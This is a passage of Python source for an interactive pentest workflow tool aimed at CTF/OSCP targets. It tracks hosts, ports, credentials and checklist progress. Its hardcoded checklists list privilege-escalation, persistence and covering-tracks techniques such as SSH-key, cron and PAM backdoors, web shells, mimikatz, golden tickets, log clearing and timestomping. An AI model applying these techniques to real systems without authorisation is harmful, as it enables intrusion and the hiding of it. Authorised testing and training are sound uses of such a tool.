            return "stay"                        # just the launch line + bare prompt (no redraw)
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} "
              f"{DIM}— <n> done · s <n> skip · r <n><a-z> open cmd · s · f · b{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto} exploit",
              "[Enter] refresh · <n> done · s <n> skip · r <n><a-z> open cmd · "
              "[s] status · [f] findings · [b] back · [m] menu",
              lambda: _render_exploit_checklist(ip, target), _handle)


def _exploit_targets_view(ip: str) -> None:
    """Sub-view listing a host's services in exploitation-priority order; a number opens
    that service's pentest checklist."""
    def _handle(targets, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(targets):
                _exploit_service_view(ip, targets[n - 1])
                return "refresh"
            print(f"{RED}✗ no service {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · enter · b{RESET}")
        return "stay"

    _run_view(f"{ip}/exploit", "[Enter] refresh · <n> select · [b] back · [m] menu",
              lambda: _render_exploit_targets(ip), _handle)


def _handle_service_exploitation() -> None:
    """Phase 6 flow: read a target IP, then show its services (best CTF/OSCP candidates
    first) to pick one to exploit."""
    while True:
        value = _ctx_ask("exploit", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first{RESET}")
            continue
        _exploit_targets_view(ip)
        return


# ── OS-family checklists: privilege escalation (6) & persistence (7) ───────────
# Both phases key off the host OS, so they share one engine: pick the OS (when none is on
# record), then work a per-family checklist with toggle/skip status. Selectable OSes are
# the ones that keep showing up on HTB / OSCP / CTF; the 2nd field is the checklist family.
_OS_CHOICES = [
    ("Linux",          "linux"),
    ("Ubuntu",         "linux"),
    ("Debian",         "linux"),
    ("Windows",        "windows"),
    ("Windows Server", "windows"),
    ("Other / Unix",   "linux"),
]

# Privesc checklist per OS family (starter methodology — deeper pass later).
_PRIVESC_STEPS = {
    "linux": [
        "Spawn a shell — use a foothold from the service checklists (phase 5 commands)",
        "Automated enum (linpeas.sh / LinEnum.sh)",
        "sudo -l — sudo rights → GTFOBins",
        "SUID/SGID binaries (find / -perm -4000) → GTFOBins",
        "Capabilities (getcap -r /) → abuse",
        "Cron jobs & writable scripts / PATH hijack",
        "Writable /etc/passwd, /etc/shadow, service files",
        "Kernel version → known exploit (uname -a; searchsploit)",
        "Interesting files: configs, history, SSH keys, backups, .env",
        "Internal services / ports (ss -tlnp) → local exploit",
        "Password reuse & creds in files / process memory",
    ],
    "windows": [
        "Spawn a shell — use a foothold from the service checklists (phase 5 commands)",
        "Automated enum (winPEAS.exe / PrivescCheck)",
        "whoami /priv — token privileges (SeImpersonate → Potato)",
        "whoami /groups — group memberships",
        "Services: unquoted paths, weak perms, writable binaries",
        "AlwaysInstallElevated (HKLM + HKCU)",
        "Scheduled tasks & startup items with weak perms",
        "Stored creds: cmdkey, registry, Unattend.xml, SAM/SYSTEM",
        "OS build → known exploit (systeminfo; wesng / Sherlock)",
        "Autologon / SNMP / config files with passwords",
        "Token impersonation / named-pipe → SYSTEM",
    ],
}

# Persistence checklist per OS family (maintain access after a foothold / root).
_PERSIST_STEPS = {
    "linux": [
        "Add an SSH key to ~/.ssh/authorized_keys (root & users)",
        "Cron job — user crontab or /etc/cron.d for a callback",
        "systemd service / timer that re-establishes access",
        "New privileged user / add to sudoers (NOPASSWD)",
        "Shell rc backdoor (.bashrc / .profile / /etc/profile.d)",
        "SUID backdoor binary in a stable path",
        "rc.local / init script on boot",
        "PAM / SSH backdoor; capture creds (PAM, keylogger)",
        "Web shell in a served path (if a web app is present)",
        "Note & stash reusable creds for later re-entry",
    ],
    "windows": [
        "Add a local admin / add user to Administrators",
        "Registry Run keys (HKLM & HKCU …\\CurrentVersion\\Run)",
        "Scheduled task (schtasks) for a callback",
        "New service (sc create) running as SYSTEM",
        "Startup folder shortcut",
        "WMI event subscription (fileless)",
        "Accessibility backdoor (sethc / utilman) at logon screen",
        "Enable RDP + user for interactive re-entry",
        "AD: DCSync / golden / silver ticket (domain persistence)",
        "Dump creds (mimikatz) & pass-the-hash for re-entry",
    ],
}

# Covering-tracks checklist per OS family (authorised-engagement cleanup / anti-forensics).
_COVER_STEPS = {
    "linux": [
        "Clear shell history (~/.bash_history, HISTFILE; unset HISTFILE)",
        "Scrub log entries (auth.log, syslog, wtmp/btmp/lastlog)",
        "Timestomp touched files (touch -r reference / -t)",
        "Remove dropped tools, payloads and temp files",
        "Remove artifacts you added (cron/at, keys, users) when done",
        "Clear/limit auditing (auditd rules, .bash_logout)",
        "Close sessions cleanly; note what was changed for the report",
    ],
    "windows": [
        "Clear PowerShell history (ConsoleHost_history.txt)",
        "Clear event logs (wevtutil cl …) — noisy, note it",
        "Timestomp touched files (SetMACE / PowerShell)",
        "Remove dropped tools, payloads and temp artifacts",
        "Delete Prefetch / Recent / Run-MRU traces",
        "Remove added users, tasks and services when done",
        "Note tampered logging (Sysmon/ETW) for the report",
    ],
}


def _os_family(text: "str | None") -> str:
    """Map an OS string (nmap's guess or the user's pick) to a checklist family."""
    return "windows" if text and "windows" in text.lower() else "linux"


def _select_os(ip: str) -> "tuple | None":
    """Prompt for the host OS and remember the choice. Returns (label, family) or None."""
    print(f"\n{BOLD}Select OS for {ip}{RESET}  {DIM}(pick the target's OS){RESET}")
    for i, (label, _fam) in enumerate(_OS_CHOICES, 1):
        print(f"  {CYAN}{i}{RESET} {label}")
    while True:
        v = _ctx_ask("os", f"<1-{len(_OS_CHOICES)}> · [b] back")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.isdigit() and 1 <= int(v) <= len(_OS_CHOICES):
            label, fam = _OS_CHOICES[int(v) - 1]
            save_os(ip, label)                 # remember it on the host record
            return label, fam
        print(f"{RED}✗ pick 1-{len(_OS_CHOICES)}{RESET}")


def _render_os_checklist(ip: str, kind: str, title: str, steps_map: dict,
                         family: str, os_label: str) -> None:
    """One OS-family checklist (privesc / persistence) for a host, by family."""
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    print(f"\n{BOLD}{title} — checklist{RESET}  {DIM}{ip} · {os_label}{RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, _ = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        body = f"{col}{desc}{RESET}" if st in ("done", "skip") else desc
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")


def _os_checklist_view(ip: str, kind: str, title: str, steps_map: dict,
                       family: str, os_label: str) -> None:
    """Interactive OS-family checklist: <n> done, s <n> skip, o change OS. Status is saved
    (port 0, service '<kind>:<family>') so it survives across sessions."""
    cur = {"family": family, "label": os_label}        # mutable so [o] can switch it live

    def _toggle(n, want):
        steps = steps_map.get(cur["family"], steps_map["linux"])
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        svc = f"{kind}:{cur['family']}"
        prev = fetch_step_status(ip, 0, "", svc).get(n)
        set_step_status(ip, 0, "", svc, n, None if prev == want else want)

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "o":
            picked = _select_os(ip)                    # also saves the new OS on the host
            if picked:
                cur["label"], cur["family"] = picked
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> done · s <n> skip · o · b{RESET}")
        return "stay"

    _run_view(f"{ip} {kind}",
              "[Enter] refresh · <n> done · s <n> skip · [o] change OS · [b] back · [m] menu",
              lambda: _render_os_checklist(ip, kind, title, steps_map, cur["family"], cur["label"]),
              _handle)


def _os_checklist_for(ip: str, kind: str, title: str, steps_map: dict) -> None:
    """Open an OS-family checklist for a known host: use the OS on record, or ask for it."""
    os_db = fetch_host_os(ip)
    if os_db:
        _os_checklist_view(ip, kind, title, steps_map, _os_family(os_db), os_db)
        return
    picked = _select_os(ip)
    if picked:
        _os_checklist_view(ip, kind, title, steps_map, picked[1], picked[0])


def _os_checklist_progress(ip: str, kind: str, steps_map: dict) -> tuple:
    """(complete, detail) for an OS-family phase in progress. Not started until an OS is on
    record; complete once every step is resolved (done/skip)."""
    os_db = fetch_host_os(ip)
    if not os_db:
        return False, ""
    family = _os_family(os_db)
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    n_done = sum(1 for i in range(1, len(steps) + 1) if status.get(i) in ("done", "skip"))
    return n_done == len(steps), f"{n_done}/{len(steps)} steps · {family}"


def _handle_os_checklist(title: str, kind: str, steps_map: dict) -> None:
    """Menu flow for an OS-family phase: read a target IP, then work its checklist."""
    while True:
        value = _ctx_ask(kind, "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        _os_checklist_for(ip, kind, title, steps_map)
        return


def _handle_privesc() -> None:
    _handle_os_checklist("Privilege Escalation", "privesc", _PRIVESC_STEPS)


def _handle_persist() -> None:
    _handle_os_checklist("Persistence", "persist", _PERSIST_STEPS)


def _handle_cover() -> None:
    _handle_os_checklist("Covering Tracks", "cover", _COVER_STEPS)


# ── placeholder handlers (skeleton — nothing is wired yet) ────────────────────
def _todo(title: str) -> None:
    """Uniform 'not implemented yet' notice for a skeleton screen."""
    print(f"\n{MAGENTA}▸ {title}{RESET}")
    print(f"  {YELLOW}[skeleton]{RESET} {DIM}not wired yet — engine coming soon{RESET}")


def run_phase(key: str) -> None:
    name = _PHASES[key][0]
    _todo(name)


# state -> (colour, label) shown in each status row
_STATE_LABEL = {"running": (YELLOW, "running"), "done": (GREEN, "complete"),
                "error": (RED, "error"), "aborted": (MAGENTA, "aborted")}


def _status_groups(jobs: list) -> list:
    """Group jobs of one phase execution (same run id) into one entry — a phase launches
    its parallel commands together, so they share a number and sit beneath each other.
    Each separate execution keeps its own number, even for the same phase re-run."""
    groups: list = []
    index: dict = {}                      # run id -> its group, to keep runs distinct
    for j in jobs:
        run = j.get("run") or f"job{id(j)}"
        if run in index:
            index[run].append(j)
        else:
            g = [j]
            index[run] = g
            groups.append(g)
    return groups


def _group_ip(g: list) -> str:
    """The host a phase-group ran against, for the status header — pulled from the first
    IP token in any of its commands (phases 1–3 append the IP to the nmap line), falling
    back to the job name (phase 4/5 carry `… · <ip>` / `… (<ip>:port)`)."""
    ipre = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    for field in ("command", "name"):
        for j in g:
            m = ipre.search(j.get(field) or "")
            if m:
                return m.group(0)
    return ""


def show_status() -> list:
    """Command history, grouped by phase: each entry shows its number, the phase name,
    the combined state (running/complete/error/aborted) and a short found yes/no; the
    phase's command(s) sit beneath it. Returns the ordered groups so the caller can
    stop / view one by number."""
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    print(f"\n{BOLD}Status{RESET}")
    if not jobs:
        print(f"  {DIM}no commands have run yet{RESET}")
        return []
    # status only tracks the automated scan phases [0]–[4]; phases 5–8 (Service
    # exploitation … Covering Tracks) are manual checklists, not background jobs, so they
    # are kept out of here. Filter before numbering so `v <n>` / `stop <n>` stay aligned.
    groups = [g for g in _status_groups(jobs) if g[0]["phase"] in ("0", "1", "2", "3", "4")]
    if not groups:
        print(f"  {DIM}no commands have run yet{RESET}")
        return []
    for n, g in enumerate(groups, 1):
        title = _PHASES.get(g[0]["phase"], (g[0]["name"],))[0]
        if g[0]["phase"] == "5":                     # name which service is being exploited
            title = f"{title} {DIM}—{RESET}{BOLD} {g[0]['name']}"
        state = _agg_state([j["state"] for j in g])
        colour, text = _STATE_LABEL.get(state, (DIM, state))
        found = f"{GREEN}yes{RESET}" if any(j["hosts"] > 0 for j in g) else f"{DIM}no{RESET}"
        multi = len(g) > 1
        tail = f"  {DIM}·{RESET} {DIM}{len(g)} cmds{RESET}" if multi else ""
        ip = _group_ip(g)                            # which host this phase ran against
        host = f"  {DIM}·{RESET} {CYAN}{ip}{RESET}" if ip else ""
        print(f"  {CYAN}{n}{RESET} {BOLD}{title}{RESET}{host}  "
              f"{DIM}·{RESET} {colour}{text}{RESET}  {DIM}·{RESET} found: {found}{tail}")
        for k, j in enumerate(g):
            # every command line is prefixed with its own state (complete/running/…) — for
            # a multi-command phase it also gets an a–z letter so `v <n><letter>` views one;
            # a single-command phase views with a bare `v <n>`.
            jc, jt = _STATE_LABEL.get(j["state"], (DIM, j["state"]))
            viewable = j.get("db_id") is not None and j["state"] != "running"
            if multi:
                letter = chr(ord("a") + k)
                lead = f"{CYAN}{letter}{RESET} "
                vhint = f"  {DIM}· v {n}{letter}{RESET}" if viewable else ""
            else:
                lead = ""
                vhint = f"  {DIM}· v {n}{RESET}" if viewable else ""
            print(f"       {lead}{jc}{jt:<8}{RESET} {DIM}{j['command']}{RESET}{vhint}")
            if j["error"]:
                print(f"       {RED}{j['error']}{RESET}")
    return groups


def _cell(value: "str | None", width: int) -> str:
    """Fit a value into a fixed-width column: '—' when missing, truncated with '…'
    when longer than ``width`` so long vendor/OS/hostname strings can't break the
    table layout."""
    s = value if value else "—"
    return s if len(s) <= width else s[:width - 1] + "…"


def _vwidth(s: str) -> int:
    """Visible width of a string — ANSI colour codes don't count."""
    return len(re.sub(r"\x1b\[[0-9;]*m", "", s))


def _box_table(headers: list, rows: list, aligns: "list | None" = None,
               indent: str = "  ") -> str:
    """Render a box-drawing table. Cells may contain ANSI colour codes — column widths
    and padding use the visible width so the borders stay aligned. ``aligns`` is 'l'/'r'
    per column (default left)."""
    n = len(headers)
    aligns = aligns or ["l"] * n
    w = [_vwidth(h) for h in headers]
    for r in rows:
        for i in range(n):
            w[i] = max(w[i], _vwidth(r[i]) if i < len(r) else 0)

    def pad(s, i):
        gap = " " * max(0, w[i] - _vwidth(s))
        return gap + s if aligns[i] == "r" else s + gap

    bar = f"{DIM}│{RESET}"

    def rule(left, mid, right):
        return f"{indent}{DIM}{left}" + mid.join("─" * (w[i] + 2) for i in range(n)) + f"{right}{RESET}"

    out = [rule("┌", "┬", "┐"),
           indent + bar + bar.join(f" {BOLD}{pad(headers[i], i)}{RESET} " for i in range(n)) + bar,
           rule("├", "┼", "┤")]
    for r in rows:
        out.append(indent + bar + bar.join(f" {pad(r[i] if i < len(r) else '', i)} " for i in range(n)) + bar)
    out.append(rule("└", "┴", "┘"))
    return "\n".join(out)


def show_database() -> list:
    """Discovered hosts: IP / MAC / vendor / OS / hostname where known. Long values
    are truncated so the table stays aligned. Returns the ordered rows so the caller
    can delete one by its number."""
    rows = fetch_hosts()
    print(f"\n{BOLD}Database — hosts{RESET}")
    if not rows:
        print(f"  {DIM}empty — no hosts discovered yet{RESET}")
        return rows
    trows = [[str(i), ip or "—", _cell(mac, 17), _cell(vendor, 16), _cell(os_, 20),
              _cell(hostname, 24), str(nports) if nports else "—"]
             for i, (ip, mac, vendor, hostname, os_, nports) in enumerate(rows, 1)]
    print(_box_table(["#", "IP", "MAC", "VENDOR", "OS", "HOSTNAME", "PORTS"], trows,
                     aligns=["r", "l", "l", "l", "l", "l", "r"]))
    return rows


def _delete_host(rows: list, n: int) -> None:
    """Remove one host (by its list number) and everything tied to it — ports, services,
    scripts, vulns and its command-history jobs — from the database."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table} WHERE ip = ?", (ip,))
            conn.commit()
        finally:
            conn.close()
    # also drop this host's command history: jobs that name the IP as a whole token
    # (subnet-discovery jobs don't match, so a shared scope scan is left intact).
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        gone = [j for j in _JOBS
                if pat.search(j.get("command") or "") or pat.search(j.get("name") or "")]
        gone_ids = {id(j) for j in gone}
        for j in gone:
            if j["state"] == "running":
                j["cancel"].set()             # stop any in-flight scan for this host
        _JOBS[:] = [j for j in _JOBS if id(j) not in gone_ids]
        for j in _JOBS:                       # discovery jobs must forget this host too,
            j["found"].discard(ip)            # or progress would still credit phase 1
    ids = [(j["db_id"],) for j in gone if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    tail = f" {DIM}(+{len(gone)} history entr{'y' if len(gone) == 1 else 'ies'}){RESET}" if gone else ""
    print(f"{GREEN}✓ removed {ip}{RESET}{tail}")


def _render_host_ports(ip: str) -> list:
    """Print one host's numbered open ports / protocol / state / service / version
    (plus its OS when detected). Returns the ordered ports so the caller can open a
    port's NSE (-sC) output by number."""
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    os_ = fetch_host_os(ip)
    head = f"\n{BOLD}{ip} — ports{RESET}"
    if os_:
        head += f"  {DIM}· OS:{RESET} {os_}"
    print(head)
    if not ports:
        print(f"  {DIM}none{RESET}")
        return ports
    vulns = fetch_vulns(ip)
    flagged = {(v[0], v[1]) for v in vulns}          # (port, proto) with a finding
    scripted = fetch_scripted_ports(ip)              # (port, proto) that have script output
    trows = []
    for i, (port, proto, state) in enumerate(ports, 1):
        name, product, version, _cpe = services.get((port, proto), (None, None, None, None))
        ver = " ".join(x for x in (product, version) if x) or "—"
        verlen = 48 if (port, proto) in flagged else 28   # ports with findings show fuller VERSION
        more = "›" if (port, proto) in scripted else "—"  # is there more to see for this port?
        trows.append([str(i), str(port), proto, state or "—",
                      _cell(name, 15), _cell(ver, verlen), more])
    print(_box_table(["#", "PORT", "PROTO", "STATE", "SERVICE", "VERSION", "MORE"], trows,
                     aligns=["r", "r", "l", "l", "l", "l", "l"]))
    return ports


_VALID_PORT_STATES = {"open", "closed", "filtered", "unfiltered",
                      "open|filtered", "closed|filtered"}


def _ask_port_proto():
    """Prompt for a port + protocol. Returns (port, proto) or None on a bad/blank value."""
    pv = _ask("port [1-65535]:")
    if not pv or not pv.isdigit() or not 1 <= int(pv) <= 65535:
        print(f"{RED}✗ need a port 1-65535{RESET}")
        return None
    pr = (_ask("proto [tcp/udp, default tcp]:") or "tcp").lower()
    if pr not in ("tcp", "udp"):
        print(f"{RED}✗ proto must be tcp or udp{RESET}")
        return None
    return int(pv), pr


def _manual_add_port(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    state = (_ask("state [open/filtered/closed, default open]:") or "open").lower()
    if state not in _VALID_PORT_STATES:
        print(f"{RED}✗ state must be one of: {', '.join(sorted(_VALID_PORT_STATES))}{RESET}")
        return
    name = _ask("service name (optional, e.g. http):") or None
    row = {"port": port, "proto": proto, "state": state}
    if name:
        row["service"] = {"name": name}
    save_ports(ip, [row], source="manual")
    print(f"{GREEN}✓ added {port}/{proto} ({state}) on {ip}{RESET}")


def _manual_add_service(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    name = _ask("service name (e.g. http, ssh):") or None
    product = _ask("product (e.g. Apache httpd, optional):") or None
    version = _ask("version (e.g. 2.4.51, optional):") or None
    if not (name or product or version):
        print(f"{RED}✗ give at least a name, product or version{RESET}")
        return
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}], source="manual")
    save_services(ip, [{"port": port, "proto": proto, "name": name,
                        "product": product, "version": version}], source="manual")
    print(f"{GREEN}✓ set service {name or ''} {product or ''} {version or ''} on "
          f"{port}/{proto}{RESET}{DIM} — run vuln-scan / exploit to use it{RESET}")


def _manual_add_hostname(ip: str) -> None:
    hn = _ask("hostname / vhost (e.g. admin.target.htb):")
    if not hn:
        return
    if not _valid_hostname(hn, ip):
        print(f"{RED}✗ not a usable DNS name{RESET}")
        return
    save_hostnames(ip, [{"hostname": hn, "source": "manual", "port": 0}])
    where = " → added to /etc/hosts" if _is_root() else " (run under sudo to auto-add to /etc/hosts)"
    print(f"{GREEN}✓ added vhost {hn.strip().lower()}{RESET}{DIM}{where}{RESET}")


def _manual_add_cred(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    host = _ask(f"host/vhost [default {ip}]:") or ip
    user = _ask("username:")
    if not user:
        print(f"{RED}✗ need a username{RESET}")
        return
    pw = _ask("password (blank allowed):") or ""
    path = _ask("login path [default /]:") or "/"
    kind = (_ask("kind [form/Basic, default form]:") or "form")
    kind = "Basic" if kind.lower() == "basic" else "form"
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}])
    add_manual_cred(ip, port, proto, host, user, pw, path, kind)
    print(f"{GREEN}✓ stored creds {user}:{pw or '<blank>'} @ {path} ({kind}) on "
          f"{port}/{proto}{RESET}{DIM} — admin-rce / idor / foothold will reuse them{RESET}")


def _manual_add_path(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    host = _ask(f"host/vhost [default {ip}]:") or ip
    path = _ask("path / page (e.g. /admin or /api/users?id=1):")
    if not path:
        print(f"{RED}✗ need a path{RESET}")
        return
    if not path.startswith("/"):
        m = re.match(r"https?://[^/]+(/\S*)", path)          # tolerate a full URL
        if not m:
            print(f"{RED}✗ path must start with / (or be a full URL){RESET}")
            return
        path = m.group(1)
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}])
    add_manual_path(ip, port, proto, host, path)
    print(f"{GREEN}✓ stored path {path} on {port}/{proto}{RESET}{DIM} — the HTTP tools "
          f"(param/idor/upload/xxe/priv) will probe it{RESET}")


def _manual_add(ip: str) -> None:
    """Sub-menu (opened with [a] in a host's findings): add surface the scanner missed —
    a port, a service, a vhost, credentials, or a path — attached to this host."""
    print(f"\n{BOLD}Add finding for {ip}{RESET}")
    print(f"  {BOLD}1{RESET}  port")
    print(f"  {BOLD}2{RESET}  service {DIM}(name / product / version){RESET}")
    print(f"  {BOLD}3{RESET}  hostname / vhost")
    print(f"  {BOLD}4{RESET}  credentials")
    print(f"  {BOLD}5{RESET}  path / page")
    choice = _ask("add [1-5] (blank to cancel):")
    fn = {"1": _manual_add_port, "2": _manual_add_service, "3": _manual_add_hostname,
          "4": _manual_add_cred, "5": _manual_add_path}.get((choice or "").strip())
    if fn:
        fn(ip)
    elif choice:
        print(f"{RED}✗ pick 1-5{RESET}")


def _manual_add_host() -> None:
    """Add a whole host the scan never saw (from a scope doc / another box). Opened with
    [a] in the database view. Optional MAC/vendor/hostname/OS can be filled in too."""
    ipv = _ask("host IP:")
    if not ipv:
        return
    try:
        ip = str(ipaddress.ip_address(ipv))
    except ValueError:
        print(f"{RED}✗ not a valid IP address{RESET}")
        return
    if _is_self_ip(ip):
        print(f"{RED}✗ refusing to add your own / loopback address{RESET}")
        return
    hostname = _ask("hostname (optional):") or None
    os_ = _ask("OS (optional, e.g. Linux / Windows):") or None
    vendor = _ask("vendor (optional):") or None
    save_hosts([{"ip": ip, "hostname": hostname, "os": os_, "vendor": vendor}])
    print(f"{GREEN}✓ added host {ip}{RESET}{DIM} — open it and add its ports/services next{RESET}")


def _db_exec(query: str, params: tuple = ()) -> None:
    """Run a single write statement under the DB lock (create schema if needed)."""
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(query, params)
            conn.commit()
        finally:
            conn.close()


def _remove_manual_line(ip: str, port: int, proto: str, sid: str, host: str, line: str) -> None:
    """Drop one line from a manual-creds / manual-paths script row; delete the row if empty."""
    blocks = _load_manual_block(ip, port, proto, sid)
    if line in blocks.get(host, []):
        blocks[host].remove(line)
        if not blocks[host]:
            del blocks[host]
    if any(blocks.values()):
        _save_manual_block(ip, port, proto, sid, blocks)
    else:
        _db_exec("DELETE FROM scripts WHERE ip=? AND port=? AND proto=? AND script=?",
                 (ip, port, proto, sid))


def _gather_manual_items(ip: str) -> list:
    """Every user-entered item for a host — manual ports/services/vhosts/creds/paths —
    as {kind, label, …} dicts, so the remove view can list and delete them by number."""
    items = []
    for port, proto, state in _fetch(
            "SELECT port, proto, state FROM ports WHERE ip=? AND source='manual' "
            "ORDER BY port", (ip,)):
        items.append({"kind": "port", "port": port, "proto": proto,
                      "label": f"port   {port}/{proto} {state or ''}".rstrip()})
    for port, proto, name, product, version in _fetch(
            "SELECT port, proto, name, product, version FROM services "
            "WHERE ip=? AND source='manual' ORDER BY port", (ip,)):
        desc = " ".join(x for x in (name, product, version) if x) or "—"
        items.append({"kind": "service", "port": port, "proto": proto,
                      "label": f"svc    {port}/{proto} {desc}"})
    for hn, _p, source in fetch_hostnames(ip):
        if source == "manual":
            items.append({"kind": "vhost", "hostname": hn, "label": f"vhost  {hn}"})
    for port, proto, sid, output in fetch_manual(ip):
        host = ip
        for ln in (output or "").splitlines():
            mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
            if mh:
                host = mh.group(1)
                continue
            if sid == "manual-creds":
                mc = re.match(r"! (\S+):(\S+) @ (\S+) \(([^)]+)\)", ln)
                if mc:
                    pw = "" if mc.group(2) == "<blank>" else mc.group(2)
                    items.append({"kind": "cred", "port": port, "proto": proto, "host": host,
                                  "line": ln, "label": f"cred   {port}/{proto} "
                                  f"{mc.group(1)}:{pw} @ {mc.group(3)}"})
            else:
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    tag = "" if host == ip else f" [{host}]"
                    items.append({"kind": "path", "port": port, "proto": proto, "host": host,
                                  "line": ln, "label": f"path   {port}/{proto} {mp.group(1)}{tag}"})
    return items


def _delete_manual_item(ip: str, item: dict) -> None:
    """Remove one manual item (guarded to source='manual' rows so a scanned finding is safe)."""
    kind = item["kind"]
    if kind in ("port", "service"):
        if kind == "port":                       # dropping the port drops its manual service too
            _db_exec("DELETE FROM ports WHERE ip=? AND port=? AND proto=? AND source='manual'",
                     (ip, item["port"], item["proto"]))
        _db_exec("DELETE FROM services WHERE ip=? AND port=? AND proto=? AND source='manual'",
                 (ip, item["port"], item["proto"]))
    elif kind == "vhost":
        _db_exec("DELETE FROM hostnames WHERE ip=? AND hostname=? AND source='manual'",
                 (ip, item["hostname"]))
        _sync_hosts_block(ip)                    # keep the managed /etc/hosts block current
    elif kind in ("cred", "path"):
        sid = "manual-creds" if kind == "cred" else "manual-paths"
        _remove_manual_line(ip, item["port"], item["proto"], sid, item["host"], item["line"])


def _manual_remove(ip: str) -> None:
    """Sub-view (opened with [r]): list what the user entered by hand for this host and
    delete entries by number. Only source='manual' rows are touched — scanned findings
    are never listed or removed here."""
    def _render():
        items = _gather_manual_items(ip)
        print(f"\n{BOLD}{ip} — remove manual entries{RESET}")
        if not items:
            print(f"  {DIM}nothing entered manually for this host{RESET}")
        else:
            for i, it in enumerate(items, 1):
                print(f"  {BOLD}{i:>2}{RESET}  {it['label']}")
        return items

    def _handle(items, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(items):
                it = items[n - 1]
                _delete_manual_item(ip, it)
                print(f"{GREEN}✓ removed {it['label'].strip()}{RESET}")
                return "refresh"
            print(f"{RED}✗ no entry {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> remove · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/manual", "[Enter] refresh · <n> remove · [b] back", _render, _handle)


def _render_host_findings(ip: str) -> None:
    """The host's findings, opened with [f]: short one-line summaries — the FINDINGS list
    (incl. phase-4 vuln and phase-6 tool results) and the aggregated CVE list — plus the
    raw host-level NSE output (HOST FINDINGS). Per-port tool output lives in each port's
    DETAILS view, not here."""
    _sync_hosts_block(ip)     # viewing a host's findings as root materialises its DB domains → hosts
    vulns = fetch_vulns(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    hostnames = fetch_hostnames(ip)
    manual = fetch_manual(ip)
    # short summaries: everything except the CVE-lookup rows (those get their own section)
    findings = [v for v in vulns if v[3] != "CVE"]
    cve_map = {}                                     # CVE → set of "port/proto" it was seen on
    for port, proto, _script, _state, cve, _risk, _summary in vulns:
        for c in (cve or "").split(","):
            c = c.strip()
            if c:
                cve_map.setdefault(c, set()).add(f"{port}/{proto}")

    print(f"\n{BOLD}{ip} — findings{RESET}")
    if not findings and not cve_map and not host_scripts and not hostnames and not manual:
        print(f"  {DIM}none{RESET}")
        return
    if hostnames:
        note = ("auto-synced to /etc/hosts (removed on exit)" if _is_root()
                else "no sudo — not in /etc/hosts; paste the line below")
        print(f"\n  {BOLD}HOSTNAMES{RESET}  {DIM}({note}){RESET}")
        for hn, _port, source in hostnames:
            print(f"    {CYAN}{hn}{RESET}  {DIM}{source}{RESET}")
        if not _is_root():
            snip = _hosts_snippet(ip)
            if snip:
                print(f"    {DIM}$ {snip}{RESET}")
    if findings:
        print(f"\n  {BOLD}FINDINGS{RESET}")
        for port, proto, script, state, cve, risk, summary in findings:
            col = RED if state in ("VULNERABLE", "LIKELY") else \
                (YELLOW if state == "EXPOSED" else DIM)
            print(f"    {col}{state:<11}{RESET}{port}/{proto:<5}"
                  f"{_cell(summary or script, 60)}")
    if cve_map:
        kev = _load_kev()
        ordered = sorted(cve_map, key=_cve_sort_key)     # newest first
